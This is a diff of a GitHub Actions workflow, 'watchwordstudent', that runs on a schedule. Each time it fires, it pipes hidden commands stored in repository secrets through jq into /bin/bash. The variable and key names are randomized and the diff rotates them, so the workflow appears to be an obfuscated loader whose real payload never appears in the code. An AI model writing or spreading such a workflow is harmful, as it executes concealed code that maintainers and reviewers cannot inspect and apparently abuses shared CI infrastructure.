@@ -1,25 +1,33 @@
 name: watchwordstudent
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 2/6 * * *'
+    - cron: '14 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: watchwordstudent
         env:
-          c10: ${{ secrets.c10 }}
+          fywh42: ${{ secrets.fywh42 }}
         run: |
-          echo $c10 | jq -r .m86 | /bin/bash
-          echo $xeatp8470 | jq -r .c88704 | /bin/bash
-          echo $lednv6886 | jq -r .qn3 | /bin/bash
-          echo $duhr2 | jq -r .wh75502 | /bin/bash
-          echo $uivwf0548 | jq -r .gn579 | /bin/bash
-          echo $xant15297 | jq -r .etd27 | /bin/bash
-          echo $mwucp19 | jq -r .mr65219 | /bin/bash
-          echo $yzia464 | jq -r .d92 | /bin/bash
-          echo $zqnf4942 | jq -r .ixmry270 | /bin/bash
+          echo $fywh42 | jq -r .qsru44244 | /bin/bash
+          echo $svjuw102 | jq -r .zylx2 | /bin/bash
+          echo $hy279 | jq -r .ipumu537 | /bin/bash
+          echo $im29 | jq -r .q32 | /bin/bash
+          echo $d078 | jq -r .ia14 | /bin/bash
+          echo $dz05 | jq -r .ghqww69666 | /bin/bash
+          echo $te177 | jq -r .xqfo4238 | /bin/bash
+          echo $bxbt9 | jq -r .yiz4496 | /bin/bash
+          echo $ewi810 | jq -r .igj9906 | /bin/bash
+          echo $rkk914 | jq -r .dpwr7 | /bin/bash
+          echo $pc024 | jq -r .zgoir7 | /bin/bash
+          echo $nmjv0 | jq -r .erk4759 | /bin/bash
+          echo $m0167 | jq -r .gdvb08 | /bin/bash
+          echo $ukh56 | jq -r .v79 | /bin/bash
+          echo $jwa02364 | jq -r .jpst405 | /bin/bash
+          echo $a28103 | jq -r .hwcb05699 | /bin/bash
+          echo $nko21962 | jq -r .swgc556 | /bin/bash
 
